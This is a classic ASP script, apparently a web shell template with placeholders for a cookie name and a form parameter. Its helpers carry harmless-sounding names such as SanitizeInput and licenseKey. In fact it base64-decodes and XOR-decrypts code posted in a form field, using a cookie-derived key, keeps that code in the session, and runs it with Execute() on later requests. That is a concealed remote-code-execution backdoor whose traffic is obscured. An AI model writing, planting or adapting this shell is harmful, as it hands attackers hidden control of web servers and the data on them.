<%
Set appSettings = Server.CreateObject("Scripting.Dictionary")

Function DecodeUploadContent(ByVal vCode)
    Dim oXML, oNode
    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    DecodeUploadContent = oNode.nodeTypedValue
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function SanitizeInput(rawInput, isBin)
    Dim size, i, result, keySize
    keySize = Len(licenseKey)
    Set DataStream = CreateObject("ADODB.Stream")
    DataStream.CharSet = "iso-8859-1"
    DataStream.Type = 2
    DataStream.Open
    If IsArray(rawInput) Then
        size = UBound(rawInput) + 1
        For i = 1 To size
            DataStream.WriteText ChrW(AscB(MidB(rawInput, i, 1)) Xor Asc(Mid(licenseKey, (i Mod keySize) + 1, 1)))
        Next
    End If
    DataStream.Position = 0
    If isBin Then
        DataStream.Type = 1
        SanitizeInput = DataStream.Read()
    Else
        SanitizeInput = DataStream.ReadText()
    End If
End Function

    Dim requestId, requestToken, truncatedToken
    requestId = "$cookie_name$"
    requestToken = ""
    If Not IsEmpty(Request.Cookies(requestId)) Then
        requestToken = Request.Cookies(requestId)
    End If
    truncatedToken = requestToken
    If Len(truncatedToken) > 16 Then
        truncatedToken = Left(truncatedToken, 16)
    End If

    If IsEmpty(requestToken) Then
        Response.End
    End If
    If IsEmpty(Session("licenseKey")) Then
        formData = Request.Form("$param$")
        If IsEmpty(formData) Then
            Response.End
        End If
        licenseKey = truncatedToken
        formData = SanitizeInput(DecodeUploadContent(formData), False)
        Session("licenseKey") = formData
        Response.End
    Else
        appSettings.Add "licenseKey", Session("licenseKey")
        Execute(appSettings("licenseKey"))
        Response.End
    End If
%>
